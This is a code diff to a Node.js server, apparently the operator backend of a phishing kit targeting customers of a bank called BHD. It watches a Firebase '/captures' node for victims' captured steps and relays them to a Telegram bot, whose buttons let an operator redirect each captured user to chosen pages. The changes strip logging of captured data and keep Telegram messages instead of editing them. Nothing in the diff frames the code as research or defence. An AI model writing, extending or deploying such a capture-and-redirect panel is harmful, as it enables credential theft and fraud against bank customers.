@@ -1,4 +1,4 @@
-// server.js - VERSIÓN CORREGIDA Y FUNCIONAL
+// server.js - VERSIÓN SIN BORRAR MENSAJES
 const express = require('express');
 const admin = require('firebase-admin');
 const axios = require('axios');
@@ -31,7 +31,6 @@ const ALLOWED_PAGES = [
 
 // === CONFIGURACIÓN MEJORADA DE FIREBASE ===
 console.log('🔧 Inicializando Firebase Admin...');
-console.log('🔑 FIREBASE_SERVICE_ACCOUNT:', process.env.FIREBASE_SERVICE_ACCOUNT ? 'PRESENTE' : 'NO PRESENTE');
 
 let serviceAccount;
 try {
@@ -43,13 +42,12 @@ try {
     console.log('✅ Firebase config cargada desde archivo local');
   }
 } catch (error) {
-  console.error('❌ ERROR CRÍTICO: No se pudo cargar la configuración de Firebase');
-  console.error('🔍 Detalles:', error.message);
-  console.error('💡 Solución: Verifica que FIREBASE_SERVICE_ACCOUNT tenga un JSON válido en Render');
+  console.error('❌ ERROR: No se pudo cargar la configuración de Firebase');
+  console.error('Detalles:', error.message);
   process.exit(1);
 }
 
-// Inicializar Firebase Admin SDK con mejor manejo de errores
+// Inicializar Firebase Admin SDK
 try {
   admin.initializeApp({
     credential: admin.credential.cert(serviceAccount),
@@ -57,9 +55,7 @@ try {
   });
   console.log('✅ Firebase Admin SDK inicializado correctamente');
 } catch (error) {
-  console.error('❌ ERROR FATAL al inicializar Firebase Admin:');
-  console.error('🔴 Mensaje:', error.message);
-  console.error('🔴 Código:', error.code);
+  console.error('❌ ERROR al inicializar Firebase:', error.message);
   process.exit(1);
 }
 
@@ -148,11 +144,9 @@ database.ref('/captures').on('child_added', async (snapshot) => {
     const data = snapshot.val();
 
     console.log(`📥 Nueva captura detectada - UID: ${uid}`);
-    console.log('📊 Datos recibidos:', JSON.stringify(data, null, 2));
 
     // Evitar procesar el campo redirectPage
     const steps = Object.keys(data).filter(key => key !== 'redirectPage');
-    console.log(`🔍 Pasos encontrados: ${steps.join(', ')}`);
     
     if (steps.length === 0) {
       console.log('⚠️ No hay pasos para procesar');
@@ -239,21 +233,15 @@ database.ref('/captures').on('child_added', async (snapshot) => {
       console.error('🔴 Status:', error.response.status);
       console.error('🔴 Data:', JSON.stringify(error.response.data, null, 2));
     }
-    
-    if (error.code) {
-      console.error('🔴 Código:', error.code);
-    }
   } finally {
     isProcessing = false;
     console.log('🔄 Listener listo para siguiente evento\n');
   }
 });
 
-// === 2. WEBHOOK PARA TELEGRAM ===
+// === 2. WEBHOOK MEJORADO - SIN BORRAR MENSAJES ===
 app.post('/telegram/webhook', express.json(), async (req, res) => {
   try {
-    console.log('📨 Webhook recibido de Telegram');
-
     // Responder inmediatamente a Telegram
     res.status(200).send('OK');
 
@@ -261,7 +249,6 @@ app.post('/telegram/webhook', express.json(), async (req, res) => {
     if (req.body.callback_query) {
       const callbackData = req.body.callback_query.data;
       const chatId = req.body.callback_query.message.chat.id;
-      const messageId = req.body.callback_query.message.message_id;
       const userId = req.body.callback_query.from.id;
       const callbackId = req.body.callback_query.id;
 
@@ -288,22 +275,23 @@ app.post('/telegram/webhook', express.json(), async (req, res) => {
 
           // Actualizar Firebase para redirigir al usuario
           await database.ref(`/captures/${uid}/redirectPage`).set(page);
+          console.log(`✅ Firebase actualizado: ${uid} -> ${page}`);
 
-          // Responder al callback query
+          // ✅ SOLO RESPONDER AL CALLBACK - NO BORRAR MENSAJE
           await axios.post(`${TELEGRAM_API}/answerCallbackQuery`, {
             callback_query_id: callbackId,
-            text: `✅ Redirigiendo a: ${page}`
+            text: `✅ Redirigiendo a: ${page}`,
+            show_alert: false  // Solo notificación pequeña, no alerta
           });
 
-          // Editar el mensaje original
-          await axios.post(`${TELEGRAM_API}/editMessageText`, {
+          // ✅ ENVIAR MENSAJE DE CONFIRMACION SEPARADO - NO EDITAR EL ORIGINAL
+          await axios.post(`${TELEGRAM_API}/sendMessage`, {
             chat_id: chatId,
-            message_id: messageId,
-            text: `✅ *REDIRECCIÓN CONFIGURADA*\n\n🔹 *UID*: \`${uid}\`\n🔹 *Destino*: ${page}\n🔹 *Admin*: ${userId}\n🔹 *Hora*: ${new Date().toLocaleString()}`,
+            text: `🔄 *REDIRECCIÓN EJECUTADA*\n\n🔹 *UID*: \`${uid}\`\n🔹 *Destino*: ${page}\n🔹 *Admin*: ${userId}\n🔹 *Hora*: ${new Date().toLocaleString()}`,
             parse_mode: 'Markdown'
           });
 
-          console.log(`✅ Redirección completada: ${uid} → ${page}`);
+          console.log(`✅ Redirección completada: ${uid} → ${page} (mensajes preservados)`);
         }
       }
     }
@@ -438,7 +426,7 @@ app.get('/', (req, res) => {
     </head>
     <body>
         <h1>🚀 Servidor BHD Firebase + Telegram</h1>
-        <div class="status success">✅ Servidor activo</div>
+        <div class="status success">✅ Servidor activo - MENSAJES PRESERVADOS</div>
         
         <div class="endpoints">
             <strong>🔧 Endpoints:</strong><br>
@@ -475,6 +463,7 @@ async function initializeServer() {
     console.log(`🧪 Test Telegram: ${SERVER_URL}/test-telegram`);
     console.log(`👂 Listener Firebase: ACTIVO`);
     console.log(`🤖 Telegram Bot: CONFIGURADO`);
+    console.log(`💾 MODO: Mensajes preservados - Sin borrar`);
   });
 }
 
